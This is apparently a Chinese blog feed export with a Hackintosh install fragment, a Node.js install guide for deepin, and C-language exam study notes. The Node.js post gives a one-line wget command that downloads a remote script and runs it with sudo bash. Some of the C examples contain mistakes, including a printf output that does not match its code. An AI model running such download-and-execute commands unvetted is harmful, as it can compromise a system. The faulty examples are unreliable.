选择磁盘工具进行抹盘（一定要注意找到你预留安装mac的盘） 先选择显示所有分区 然后选择要安装macOS的盘，选择抹掉 格式选APFS 名称可以随意，我这里填Mac 选择安装macos 提示安装副本已损坏，这个是因为证书过期导致的，先断开网络然后用终端设置一下时间即可 如图，打开终端 在终端输入命令，date 102516242016，按回车键执行，然后关闭终端，重新回到macOS实用工具，选择安装macOS即可 安装macOS 阅读许可协议，点击继续 点击同意，继续 出现安装界面，这里是让你选择安装磁盘，选择之前我们抹掉的Mac盘，点击安装 正在安装 刚刚的过程并没有实际的安装，只是把文件复制进去了，等待自动重启，进入CLOVER，选择Boot macOS install from Mac，进入二次安装（不一定是from Mac，这里是因为我的磁盘名字叫做Mac） 不出意外，等待安装结束，你就可以享受黑苹果系统带来的乐趣了，enjoy it！ 成功 已知的一些小问题 10.13.6 不能登录iCloud，一登录重启就丢失引导 亮度修改快捷键无效，可用Karabiner-Elements修改 10.14.6 亮度修改快捷键无效，可用Karabiner-Elements修改 10.14.2 基本没问题 亮度可直接使用联想的功能键修改，跟windows下一模一样 通用的问题 独立显卡无解 无线网卡无解，可以去淘宝买一个comfast的USB网卡，20块钱，mac，windows，linux都可用 偶尔识别不到声卡，重启一下，问题就解决了；如果重启问题没解决的话，把ESP分区下的APPLE目录删除再重启就解决了]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>双系统</tag>
        <tag>黑苹果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下安装nodejs最新版]]></title>
    <url>%2Fposts%2F79193e4e%2F</url>
    <content type="text"><![CDATA[deepin下安装nodejs安装方式一 说明：理论上Debian系都支持，但是博主未测试，如果安装遇到问题，欢迎留言讨论 使用快捷键 Ctrl + Alt + T 打开终端 使用以下命令安装 1wget -O install-nodejs.sh https://zimo.coding.net/p/debain-install-nodejs/d/debain-install-nodejs.sh/git/raw/master/install-nodejs.sh &amp;&amp; sudo bash install-nodejs.sh 方式二 使用快捷键 Ctrl + Alt + T 打开终端 使用命令dedit install-nodejs.sh新建文件 将以下脚本复制，粘贴到install-nodejs.sh中 123456sudo apt install curlcurl -sSL https://deb.nodesource.com/gpgkey/nodesource.gpg.key | sudo apt-key add -echo "deb https://mirrors.tuna.tsinghua.edu.cn/nodesource/deb_12.x stretch main" | sudo tee /etc/apt/sources.list.d/nodesource.listecho "deb-src https://mirrors.tuna.tsinghua.edu.cn/nodesource/deb_10.x stretch main" | sudo tee -a /etc/apt/sources.list.d/nodesource.listsudo apt updatesudo apt install nodejs 保存，回到终端赋予执行权限，命令chmod +x install-nodejs.sh 使用命令./install-nodejs.sh执行安装： 验证12node -vnpm -v 成功出现下图版本，即为成功 其他Linux请参考nodejs官方文档安装]]></content>
      <categories>
        <category>linux</category>
        <category>nodejs</category>
      </categories>
      <tags>
        <tag>deepin</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[考研笔记之807程序综合设计]]></title>
    <url>%2Fposts%2Fc0a59335%2F</url>
    <content type="text"><![CDATA[博文声明 首先，本博客是博主花时间精心整理的，如果觉得整理得还不错，请打赏支持下，毕竟创作不易，打赏按钮在文末。 然后，如果发现博文有错误，可以直接评论，或者直接联系博主，博主审核后会尽快更新博客。 再者，本文所有代码实例：C标准是C89，IDE是CLion2019.2.4，编译器是gcc (Debian 5.5.0-12) 5.5.0。 另外，本文严禁任何形式的搬砖或者转载，违者必究。 最后，祝大家取得好成绩。 考试相关信息考试大纲 807考试大纲 1、C基础知识 （1）掌握数据类型、变量和赋值； （2）掌握输入和输出； （3）掌握基本运算符和表达式； （4）了解简单控制流程及流程图表示的规范。 2、选择结构程序设计 （1）掌握关系运算符； （2）掌握逻辑运算符； （3）掌握布尔表达式求值； （4）掌握if语句； （5）掌握switch语句； （6）理解分支结构的流程图表示。 3、循环控制 （1）掌握for循环； （2）掌握while循环； （3）掌握do-while循环； （4）理解循环结构的流程图表示。 4、数组的使用 （1）掌握一维数组； （2）掌握二维数组； （3）理解字符数组与字符串。 5、函数的使用 （1）掌握函数的原型声明、调用及返回； （2）掌握函数参数； （3）理解变量存储特性。 6、指针的使用 （1）理解指针的声明与初始化； （2）理解指针与数组； （3）理解字符串与指针。 7、结构体 （1）理解结构体变量； （2）了解结构体数组； （3）了解结构体与指针； （4）了解链表的使用。 参考书目《C程序设计第四版》-谭浩强 考题类型 单项选择题。 判断正误题。 程序分析题。 设计算法流程图题。 编程题。 笔记正文第一模块 C基础知识考试大纲的要求（1）掌握数据类型、变量和赋值；（2）掌握输入和输出；（3）掌握基本运算符和表达式；（4）了解简单控制流程及流程图表示的规范。 笔记C语言数据类型C语言中，数据类型可分为：基本数据类型，枚举类型（enum），派生类型，空类型（void）四大类。 注意：C语言基本数据类型，三个空填整型、实型、字符型，两个空填整型和实型，其中实型也可改为浮点型。 C语言数据类型 基本数据类型 整型类型 整型（int） 短整型（short） 长整型（long） 浮点类型（也叫实型） 单精度浮点型（float） 双精度浮点型（double） 字符类型（char）（也可看做整型） 枚举类型（enum） 空类型（void） 派生类型 指针类型（*） 数组类型（[]） 结构体类型（struct） 共用体类型（union） C语言数据类型的存储空间和值的范围 类型 存储空间（字节） 值的范围 int 4 -2147483648～2147483647，即-231～231-1 short 2 -32768～32767，即-215～215-1 char 1 -128～127，即-27～27-1 float 4 有效数字6位，范围:0以及1.2x10-38～3.4x1038 double 8 有效数字15位，范围:0以及2.3x10-308～1.7x10308 标识符 标识符是给常量或者变量起的名字。 C语言标识符规范：标识符可以是字母(A～Z，a～z)、数字(0～9)、下划线_组成的字符串，并且第一个字符必须是字母或下划线 注意事项 标识符不能是C语言关键字； 标识符不能重复定义； 标识符大小写敏感； 标识符长度不要太长； 标识符最好见名知意。 C语言常量程序运行过程中，值不会改变的量，一般用来给变量赋值，直接放在等号的右边（这样的常量也叫字面量），如int a = 120;float b = 0.1234;// 等号左边的a,b是变量（标识符），等号右边的整数和小数是字面量。 符号常量用编译预处理语句（不是C语言的语句）声明的常量叫符号常量，如：#define 标识符 常量值，这样的常量在编译前，定义的标识符就会被预处理，整体替换为后面的常量值。 字面量字面量通常是直接写在赋值（=）号右边的常量。 整型常量：整数，通常指十进制整数，由0-9的数字组成，可带正负号，如6，+100，-3等。 八进制整型常量：八进制整数，以0开头，由0-7的数字组成，可带正负号，如-01,011,+077等； 十进制整型常量：通常意义上的整型常量； 十六进制整型常量：十六进制整数，以0x开头，由0-9的数字和字母a-f组成，可带正负号，如0x17a，-0xffff，+0xabc123，0XabA1（字母可大写，可大小写混合）； 注意：C语言中没有二进制整型常量。 实型常量：小数，一般不考虑进制，即默认为十进制小数，当小数点前一位只有0时，可以省略0，即0.121还可以表示为.121；同理指数形式也可省略，0.2e3还可以表示为.2e3。 十进制小数形式：由数字和小数点组成，可带正负号，如0.123，+6.24，-3.2等； 指数形式：以字母e代表10为底的指数，指数只能是整数（即e3表示10的3次方，e-5表示10的-5次方），如12.3e-5，3.1e10，+1e0，,1.2e3； 注意：指数形式，当小数点前面只有0，且e前没有整数时，0不可省略，如0.e5，如果省略就变成了.e5，是错误的 字符常量：用单撇号括起来的字符，通常只有一个字符，转义字符除外。 普通字符：用单撇号括起来的一个字符，如‘a’，‘3’，‘A’，‘$’，‘ ’，&#39;&quot;&#39;等 转义字符：以\开头的字符，如&#39;\n&#39;，&#39;\t&#39;,&#39;\\&#39;，&#39;\&#39;&#39;，‘\&quot;’等。 八进制字符（属于转义字符的一种）：用单撇号括起来的以\开头，由0-7的数字组成的串，最多只有三位数字，理解的时候转换为十进制所对应的ASCII码所对应的字符即可，如：&#39;\041&#39;，&#39;\040&#39; 十六进制字符（属于转义字符的一种）：用单撇号括起来的以\x开头，由0-9的数字和a-z的字母组成的串，最多只有两位，理解的时候转换为十进制所对应的ASCII码所对应的字符即可，如：&#39;\x28&#39;，&#39;\x29&#39; 字符串常量：用双撇号括起来的零个或者多个字符（可以是上面的字符常量组成），如&quot;abd&quot;，&quot;sdf123&quot;，“1”等。 字符常量——转义字符表转义字符 意义 ASCII码值（十进制） \a 响铃(BEL) 007 \b 退格(BS) ，将当前位置移到前一列 008 \f 换页(FF)，将当前位置移到下页开头 012 \n 换行(LF) ，将当前位置移到下一行开头 010 \r 回车(CR) ，将当前位置移到本行开头 013 \t 水平制表(HT) （跳到下一个TAB位置） 009 \v 垂直制表(VT) 011 \\ 代表一个反斜线字符''\' 092 \' 代表一个单引号（撇号）字符 039 \" 代表一个双引号字符 034 \?代表一个问号063\0 空字符(NUL) 000 \ddd 1到3位八进制数所代表的任意字符 三位八进制 \xhh 十六进制所代表的任意字符 两位十六进制 C语言变量程序运行过程中，值可以改变的量。 变量会占据内存中一定的存储单元； 使用变量之前必须先定义； 变量名和变量值是完全不同的两个概念； 变量定义的一般形式为：数据类型 变量名; 可以同时定义多个类型相同的变量：数据类型 变量名, 变量名, 变量名…; 变量名必须满足标识符的规范； 数据类型必须是C语言数据类型； 如果定义了变量未赋值就使用，那么该变量的值将不可预测。 给变量赋值的方式 先定义后赋值。 定义的同时赋值。 注意：变量在定义中不允许连续赋值，如：int a = b = c = 3;是错误的语句，但是已经定义好的变量允许连续赋值。 1234567891011#include &lt;stdio.h&gt;int main() &#123; // 示例代码——定义变量，并给变量赋值 int a; a = 2;// 先定义后赋值 double b = -.14;// 定义的同时赋值 int c,d; c = d = a = 5;// 已经定义好了的变量可以连续赋值 return 0;&#125; C语言输入与输出C语言没有输入输出语句C语言的输入输出操作都需要依赖库函数，常用的输入输出函数是scanf()和printf()，使用时需要先引入头文件#include&lt;stdio.h&gt;。 C语言printf()函数格式化输出函数。 函数原型：int printf(const char *format, ...)用法：printf(“格式控制字符串”, 输出表列)功能：将变量转化为“格式控制字符串”所规定格式的数据，然后输出到终端中。格式字符串是以%开头的字符串，在%后面跟有各种格式字符，以说明输出数据的类型、形式、长度、小数位数等，一般形式为[标志][输出最小宽度][.精度][长度]类型，（注意：[]表示可省略的项）。 类型： 格式字符 意义 d 以十进制形式输出带符号整数(正数不输出符号) o 以八进制形式输出无符号整数(不输出前缀0) x,X 以十六进制形式输出无符号整数(不输出前缀Ox) u 以十进制形式输出无符号整数 f 以小数形式输出单、双精度实数 e,E 以指数形式输出单、双精度实数 g,G 以%f或%e中较短的输出宽度输出单、双精度实数 c 输出单个字符 s 输出字符串 标志： 标 志 意义 - 结果左对齐，右边填空格 + 输出符号(正号或负号) 空格 输出值为正时冠以空格，为负时冠以负号 # 对c、s、d、u类无影响； 对o类，在输出时加前缀o； 对x类，在输出时加前缀0x； 对e、g、f 类当结果有小数时才给出小数点。 输出最小宽度 用十进制整数来表示输出的最少位数。若实际位数多于定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补以空格或0。 精度 精度格式符以“.”开头，后跟十进制整数。 长度 长度格式符为h、l两种，h表示按短整型量输出，l表示按长整型量输出。 printf()函数实例 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;int main() &#123; int a = 15; double b = 123.1234567; double c = 12345678.1234567; char d = 'p'; printf("a=%d\n", a); printf("a(%%d)=%d, a(%%5d)=%5d, a(%%o)=%o, a(%%x)=%x\n\n", a, a, a, a); // %% 可以输出 % printf("b=%f\n", b); printf("b=%-8.2f\n", b); // 左对齐，占8格，四舍五入后精确到小数点后两位 printf("b(%%f)=%f, b(%%lf)=%lf, b(%%5.4lf)=%5.4lf, b(%%e)=%e\n\n", b, b, b, b); printf("c=%f\n", c); printf("c(%%lf)=%lf, c(%%f)=%f, c(%%8.4lf)=%8.4lf\n\n", c, c, c); printf("d=%c\n", d); printf("d(%%c)=%c, d(%%8c)=%8c\n", d, d); return 0;&#125;/*输出结果*//*a=15a(%d)=15, a(%5d)= 15, a(%o)=17, a(%x)=fb=123.125457b=123.13 b(%f)=123.125457, b(%lf)=123.125457, b(%5.4lf)=123.1255, b(%e)=1.231255e+02c=12345678.123457c(%lf)=12345678.123457, c(%f)=12345678.123457, c(%8.4lf)=12345678.1235d=pd(%c)=p, d(%8c)= p*/ C语言scanf()函数格式化输入函数。 函数原型：int scanf(const char *format, ...)用法：scanf(&quot;输入控制符&quot;, 输入参数)功能：将从键盘输入的字符转化为“输入控制符”所规定格式的数据，然后存入以输入参数的值为地址的变量中。输入控制符几乎与printf()一模一样。注意：输入参数接收的是地址，在某些情况下，请注意使用&amp;运算符。 小结printf()和scanf() 细节很多，不用全部熟记，熟记下面的注意事项即可； 控制符中，%d、%f、%s、%c 最常用，功能分别是输出整数、实数、字符串和字符； printf()使用时需注意转义字符有特殊的含义； scanf()在某些情况下，使用时需注意使用&amp;运算符； 编译器不会检查输入和输出的参数数目与控制符数目是否一致； scanf()函数的双引号内，除了“输入控制符”外尽量什么都不要写，否则读入可能跟预想不一样； 使用scanf()函数输入字符串时，要注意，scanf()读到第一个空格、或者Tab或者回车符就会结束读入； 在某些情况下可能会遇到scanf()和printf()的返回值，所以特别说明一下，返回值的意义，用scanf()读取几个数据，则scanf()的返回值为几，printf()同理，用printf()输出几个数据，则printf()的返回值为几。 printf()函数拓展问题，请思考下面的程序输出结果是？1234567#include &lt;stdio.h&gt;int main() &#123; int i = 1; printf("i=%d,i++=%d,++i=%d",i,i++,++i); return 0;&#125; C语言其他输入输出函数 getchar()，输入单个字符，常用来去掉scanf()缓存的回车符。 putchar()，输出单个字符。 gets()，输入字符串，可以输入含空格的字符串。 puts()，输出字符串。 C语言基本运算符算术运算符下表显示了 C 语言支持的所有算术运算符。假设变量 A 的值为 3，变量 B 的值为 20，则： 运算符描述实例 +把两个操作数相加 A + B 将得到 23 -从第一个操作数中减去第二个操作数 A - B 将得到 -17 *把两个操作数相乘 A * B 将得到 60 /分子除以分母 B / A 将得到 6（整型 / 整型 最后的结果还是整型，所以没有小数部分） %取模运算符，整除后的余数 B % A 将得到 2 ++自增运算符，整数值增加 1 A++ 将得到 4 --自减运算符，整数值减少 1 A-- 将得到 2 注意：B = A++、B = A--先赋值后运算，B = ++A、B = --A先运算后赋值 关系运算符下表显示了 C 语言支持的所有关系运算符。假设变量 A 的值为 10，变量 B 的值为 20，则： 运算符描述实例 ==检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 为假。 !=检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 &gt;检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A &gt; B) 为假。 &lt;检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A &lt; B) 为真。 &gt;=检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A &gt;= B) 为假。 &lt;=检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A &lt;= B) 为真。 逻辑运算符下表显示了 C 语言支持的所有关系逻辑运算符。假设变量 A 的值为 1，变量 B 的值为 0，则： 运算符描述实例 &amp;&amp;称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A &amp;&amp; B) 为假。 ||称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A || B) 为真。 !称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A &amp;&amp; B) 为真。 赋值运算符下表列出了 C 语言支持的赋值运算符： 运算符描述实例 =简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C +=加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -=减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *=乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C *= A 相当于 C = C * A /=除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %=求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A 其他运算符 sizeof &amp; 三元 运算符描述实例 sizeof()返回变量或者类型的大小。sizeof(a) 将返回 4，其中 a 是整数。 sizeof(double) 将返回 8 &amp;返回变量的地址。&amp;a; 将给出变量的地址。 *指向一个变量或取指针所指向内存地址的值。int *a = &b; 将指向一个变量。b = *a：将取出a指向地址的变量值赋值给b。 条件表达式 ? X : Y ;条件表达式如果条件为真 ? 则值为 X : 否则值为 Y C语音中的运算符优先级运算符的优先级确定表达式怎么计算，最终会影响到表达式的值。某些运算符比其他运算符有更高的优先级，例如，乘除运算符具有比加减运算符更高的优先级。 下表将按运算符优先级从高到低列出各个运算符，具有较高优先级的运算符出现在表格的上面，具有较低优先级的运算符出现在表格的下面。在表达式中，较高优先级的运算符会优先被计算。 类别&nbsp; 运算符&nbsp;结合性&nbsp; 后缀运算符&nbsp;() [] -&gt; . ++ - - &nbsp; 从左到右&nbsp; 一元运算符&nbsp; + - ! ~ ++ - - (type)* &amp; sizeof&nbsp; 从右到左&nbsp; 乘除运算符&nbsp; * / %&nbsp;从左到右&nbsp; 加减运算符&nbsp;+ -&nbsp; 从左到右&nbsp; 关系运算符&nbsp;&lt; &lt;= &gt; &gt;=&nbsp; 从左到右&nbsp; 相等运算符&nbsp; == !=&nbsp; 从左到右&nbsp; 条件运算符&nbsp;?:&nbsp; 从右到左&nbsp; 赋值运算符&nbsp; = += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |=&nbsp;从右到左&nbsp; 逗号运算符&nbsp; ,&nbsp; 从左到右&nbsp; C语言表达式表达式（Expression）和语句（Statement）的概念在C语言中并没有明确的定义: 表达式可以看做一个计算的公式（字面理解是表达某种含义的式子），往往由数据、变量、运算符等组成，例如3*4+5、a=c=d等，表达式的结果必定是一个值； 语句的范围更加广泛，不一定是计算，不一定有值，可以是某个操作、某个函数、选择结构、循环等。 划重点： 表达式必须有一个执行结果，这个结果必须是一个值，例如3*4+5的结果 17，a=c=d=10的结果是 10，printf(&quot;hello&quot;)的结果是 5（printf()函数的返回值是成功打印的字符的个数）。 以分号;结束的往往称为语句，而不是表达式，例如3*4+5;、a=c=d;等； 语句不一定以分号结束，比如if语句，for语句 自动类型转换一个表达式中出现不同类型间的混合运算，较低类型将自动向较高类型转换，这个自动转换的过程就叫自动类型转换。 不同数据类型之间的差别在于数据的表示范围及精度上，一般情况下，数据的表示范围越大、精度越高，其类型也越“高级”。 赋值运算中如果左值精度比右值精度低，将会出现截断，会导致精度丢失。 当函数调用时，所传实参与形参类型不一致时，也会把实参自动转换为形参类型后再赋值（类型以形参为准）。 强制类型转换C 语言提供了可显式指定类型转换的语法支持，通常称之为强制类型转换。 1(目标类型) 表达式 算法流程图基本符号 顺序结构基本流程图 选择结构基本流程图 循环结构基本流程图 画流程图的步骤 写算法描述。 转换为图（需要按照实际情况组合顺序结构，循环结构，选择结构对应的基本流程图）。 实例：判断闰年，画法一算法描述： 123451. 从键盘输入year年份2. 判断year是否满足year % 4 == 0 &amp;&amp; year % 100 != 03. 是，输出year是闰年4. 不是，判断year是否满足year % 100 == 0 &amp;&amp; year % 400 == 05. 是，输出year是闰年，否则输出year不是闰年 流程图： 代码实现： 1234567891011121314#include &lt;stdio.h&gt;int main() &#123; int year; scanf("%d", &amp;year); if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; printf("%d 是闰年", year); &#125; else if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125; 实例：判断闰年，画法二算法描述： 12345678主流程：1. 从键盘输入year年份2. 判断是否闰年，若是，输出year是闰年，否则输出输出year不是闰年子流程：判断是否闰年：参数是输入年份1. 判断year是否满足year % 4 == 0 &amp;&amp; year % 100 != 02. 是，返回13. 不是，判断year是否满足year % 100 == 0 &amp;&amp; year % 400 == 04. 是，返回1，否则返回0 流程图： 代码实现： 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;bool isLeapYear(int year);int main() &#123; int year; scanf("%d", &amp;year); if (isLeapYear(year)) &#123; printf("%d 是闰年", year); &#125; else &#123; printf("%d 不是闰年", year); &#125; return 0;&#125;bool isLeapYear(int year) &#123; if (year % 4 == 0 &amp;&amp; year % 100 != 0) &#123; return 1; &#125; if (year % 100 == 0 &amp;&amp; year % 400 == 0) &#123; return 1; &#125; return 0;&#125; 第二模块 选择结构程序设计考试大纲的要求（1）掌握关系运算符；（2）掌握逻辑运算符；（3）掌握布尔表达式求值；（4）掌握if语句；（5）掌握switch语句；（6）理解分支结构的流程图表示。 笔记C语言逻辑真假非0为真（true），0为假（false）。 在关系和逻辑表达式中，若表达式为真则值取1，否则值取0。 关系运算符C 语言提供的关系运算符有： &gt;（大于）、&gt;=（大于等于）、&lt;（小于）、&lt;=（小于等于）、==（等于）和 !=（不等于）6 种二元关系运算符。 在以上 6 种关系运算符中，前 4 个的优先级高于最后两个。 由关系运算符组成的式子为关系表达式，如 a &gt; b 即为关系表达式，在 C 语言中，同逻辑表达式一样，关系表达式的值也为逻辑值，即布尔型（bool），取值为真或假。 关系运算符一般不能连用，如果连用将表达不同的含义，如： 1234567891011#include &lt;stdio.h&gt;int main() &#123; int a = 1; int b = 2; int c = 3; int d = a &lt;= b &lt;= c;// a &lt;= b &lt;= c不是表达b的值在[a,b]之间，而是a先和b比较，a&lt;=b所以表达式的值是1，然后1与c比较，1&lt;=c，右值是1，然后赋给左值，所以d的值是1 // 如果要表达b的值在[a,c]之间应该是b &gt;= a &amp;&amp; b &lt;= c printf("%d",d); return 0;&#125; 逻辑运算符 与运算(&amp;&amp;)：参与运算的两个表达式都为真时，结果才为真，否则为假； 或运算(||)：参与运算的两个表达式只要有一个为真，结果就为真；两个表达式都为假时结果才为假； 非运算(!)：参与运算的表达式为真时，结果为假；参与运算的表达式为假时，结果为真。 逻辑运算符和关系运算符与其他运算符的优先级赋值运算符(=) &lt; &amp;&amp;和|| &lt; 关系运算符 &lt; 算术运算符 &lt; 非(!) 布尔表达式求值 确定运算符优先级 确定运算符结合方向 得出值（布尔表达式的值只可能是0或者1） if语句1234567// 形式1——表达式的值不为0，就执行操作1（操作1可包含多条语句），否则什么都不做，往下继续执行if (表达式) &#123; 操作1&#125;// 形式2——表达式的值不为0，就执行语句（只有一条语句），否则什么都不做，往下继续执行if (表达式) 语句; if else语句12345678910// 形式1——表达式的值不为0，就执行操作1，否则执行操作2（操作1,2可包含多条语句）if (表达式) &#123; 操作1&#125; else &#123; 操作2&#125;// 形式二——表达式的值不为0，就执行语句1，否则执行语句2（语句1,2只能是单条语句）if (表达式) 语句1;else 语句2 并列的if else语句123456789101112131415161718/* 如果表达式1的值不为0，就执行操作1 否则判断表达式2的是否为0，如果不为0，执行操作2 否则判断表达式3的值是否为0，如果不为0，执行操作3， ... 否则判断表达式n的值是否为0，如果不为0，执行操作n， 否则执行操作n+1 注意，操作1～n+1中只有一个可以执行*/if (表达式1) &#123; 操作1&#125; else if (表达式2) &#123; 操作2&#125; else if (表达式3) &#123; 操作3&#125; ...else if (表达式n) &#123; 操作n&#125; else &#123; 操作n+1&#125; 嵌套的if else语句123456789101112/*如果表达式1的值不为0，判断表达式2的值是否为0，如果表达式2的值为0，执行操作1，否则判断表达式3的值是否为0，如果不为0，执行操作2，否则执行操作3*/if (表达式1) &#123; if (表达式2) &#123; 操作1 &#125;&#125; else &#123; if (表达式3) &#123; 操作2 &#125; else &#123; 操作3 &#125;&#125; 注意：多种形式的if、if else、并列的if else、嵌套的if else等可以相互组合和嵌套，但是不建议嵌套太多层，那样会减低程序的可阅读性。 switch语句一个 switch 语句允许测试一个变量等于多个值时的情况。每个值称为一个 case，且被测试的变量会对每个 switch case 进行检查。switch 语句的语法： 123456789101112switch(expression)&#123; case constant-expression : statement(s); break; /* 可选的 */ case constant-expression : statement(s); break; /* 可选的 */ /* 可以有任意数量的 case 语句 */ default : /* 可选的 */ statement(s);&#125; switch 语句必须遵循下面的规则： switch 语句中的 expression 是一个常量表达式，必须是一个整型（char本质上属于整型）或枚举类型。 在一个 switch 中可以有任意数量的 case 语句。每个 case 后跟一个要比较的值和一个冒号。 case 的 constant-expression 必须与 switch 中的变量具有相同的数据类型，且必须是一个常量或字面量。 当被测试的变量等于 case 中的常量时，case 后跟的语句将被执行，直到遇到 break 语句为止。 当遇到 break 语句时，switch 终止，控制流（可理解为程序的执行过程）将跳转到 switch 语句后的下一行。 不是每一个 case 都需要包含 break。如果 case 语句不包含 break，控制流将会 继续执行 后续的 case，直到遇到 break 为止。 一个 switch 语句可以有一个可选的 default，一般出现在 switch 的结尾。default 可用于在上面所有 case 都不为真时执行一个任务。default 中的 break 语句不是必需的。 第三模块 循环控制考试大纲的要求（1）掌握for循环；（2）掌握while循环；（3）掌握do-while循环；（4）理解循环结构的流程图表示。 笔记for循环for 循环允许编写一个执行指定次数的循环控制结构。 for 循环的语法： 1234for ( init; condition; increment )&#123; statement(s);&#125; for 循环的控制流： init 会首先被执行，且只会执行一次。这一步允许您声明并初始化任何循环控制变量。您也可以不在这里写任何语句，只要有一个分号出现即可。 接下来，会判断 condition。如果为真，则执行循环主体。如果为假，则不执行循环主体，且控制流会跳转到紧接着 for 循环的下一条语句。 在执行完 for 循环主体后，控制流会跳回上面的 increment 语句。该语句允许您更新循环控制变量。该语句可以留空，只要在条件后有一个分号出现即可。 条件再次被判断。如果为真，则执行循环，这个过程会不断重复（循环主体，然后增加步值，再然后重新判断条件）。在条件变为假时，for 循环终止。 while循环只要给定的条件为真，C 语言中的 while 循环语句会重复执行一个目标语句。 while 循环的语法： 1234while(condition)&#123; statement(s);&#125; statement(s) 可以是一个单独的语句，也可以是几个语句组成的代码块。 condition 可以是任意的表达式，当为任意非零值时都为 true。当条件为 true 时执行循环。 当条件为 false 时，退出循环，程序流将继续执行紧接着循环的下一条语句。 do…while循环不像 for 和 while 循环，它们是在循环头部测试循环条件。在 C 语言中，do…while 循环是在循环的尾部检查它的条件。 do…while 循环与 while 循环类似，但是 do…while 循环会确保至少执行一次循环。 do…while 循环的语法： 12345do&#123; statement(s);&#125;while( condition ); 注意，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次。 如果条件为真，控制流会跳转回上面的 do，然后重新执行循环中的 statement(s)。这个过程会不断重复，直到给定条件变为假为止。 死循环如果循环控制流中条件表达式的值永远为true，称为死循环，通常是应该避免的。 常见死循环： 123456789101112131415161718// for形式死循环for(;;) &#123;&#125;for(;1;) &#123;&#125;// while形式死循环while(1) &#123;&#125;// do...while形式死循环do&#123;&#125;while(1); 三种循环语句比较while、do...while和for三种循环在具体的使用场合上有区别，具体如下： 在知道循环次数的情况下更适合使用for循环； 在不知道循环次数的情况下适合使用while或者do-while循环，如果有可能一次都不循环应使用while循环，如果至少循环一次应使用do-while循环; 从本质上讲，while,do...while和for循环之间可以相互转换。 多重循环（循环嵌套）有时候一个循环有可能满足不了需求，或者说使用起来不太方便，如：遍历二维数组时，这个时候我们就需要用到多重循环，多重循环就是在循环结构（含有循环语句的结构就叫循环结构）的循环体中又出现循环结构。 使用break语句跳出循环break 语句，可以跳出循环，还可以跳出 switch。 break 语句不能用于循环语句和 switch 语句之外的任何其他语句中。 在没有循环结构的情况下，break不能用在单独的if else语句中。 在多层循环中，一个break语句只跳出当前循环。 使用break语句，可以跳出死循环。 使用continue语句结束循环continue 的用法十分简单，其作用为结束本次循环，即跳过循环体中下面尚未执行的语句，然后进行下一次是否执行循环的判定。 continue和break的区别continue 语句和 break 语句的区别是，continue 语句只结束本次循环，而不是终止整个循环。 break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立。 而且，continue 只能在循环语句中使用，即只能在 for、while 和 do…while 中使用，除此之外 continue 不能在任何语句中使用。 第四模块 数组的使用考试大纲的要求（1）掌握一维数组；（2）掌握二维数组；（3）理解字符数组与字符串。 笔记数组数组是在内存中连续存储的具有相同类型的一组数据的集合 一维数组语法： 1类型说明符 数组名[正整数常量表达式]; 例如： 1int a[5]; 表示定义了一个整型数组，数组名为 a，定义的数组称为数组 a。数组名 a 除了表示该数组之外，还表示该数组的首地址。 此时数组 a 中有 5 个元素，每个元素都是 int 型变量，而且它们在内存中的地址是连续分配的。也就是说，int 型变量占 4 字节的内存空间，那么 5 个int型变量就占 20 字节的内存空间，而且它们的地址是连续分配（物理相邻）的。 元素就是变量，数组中习惯上称为元素。 定义数组时，需要指定数组中元素的个数。方括号中的正整数常量表达式就是用来指定元素的个数。数组中元素的个数又称数组的长度。 C语音通过给每个数组元素进行编号的方式访问数组中的元素。数组元素的编号又叫下标，访问数组中第5个元素的方式应该是a[4]。 因为数组中的下标是从 0 开始的。 一维数组初始化: 定义数组时给所有元素赋初值，这叫“完全初始化”。例如：1int a[5] = &#123;1, 2, 3, 4, 5&#125;; 通过将数组元素的初值依次放在一对花括号中，初始化之后，a[0]=1；a[1]=2；a[2]=3；a[3]=4；a[4]=5，即从左到右依次赋给每个元素。需要注意的是，初始化时各元素间是用逗号隔开的，不是用分号。 可以只给一部分元素赋值，这叫“不完全初始化”。例如：1int a[5] = &#123;1, 2&#125;; 定义的数组 a 有 5 个元素，但花括号内只提供两个初值，这表示只给前面两个元素 a[0]、a[1] 初始化，而后面三个元素都没有被初始化。值得注意的是，不完全初始化时，没有被初始化的元素自动为 0。 需要注意的是，“不完全初始化”和“完全不初始化（未初始化，即只声明了但未赋值）”不一样。如果“完全不初始化”，即只定义int a[5]；而不初始化，那么各个元素的值就不是0了，所有元素的值都是不确定值。 数组跟变量一样必须先定义，然后使用。 通常用for循环语句遍历数组。 常见错误1： 123456# include &lt;stdio.h&gt;int main() &#123; int a[5]; a[5] = &#123;1, 2, 3, 4, 5&#125;;// 错误的原因是，只有在定义时才可以用大括号初始化 return 0;&#125; 常见错误2： 12345# include &lt;stdio.h&gt;int main() &#123; int a[5] = &#123;1, 2, 3, 4, 5, 6&#125;;// 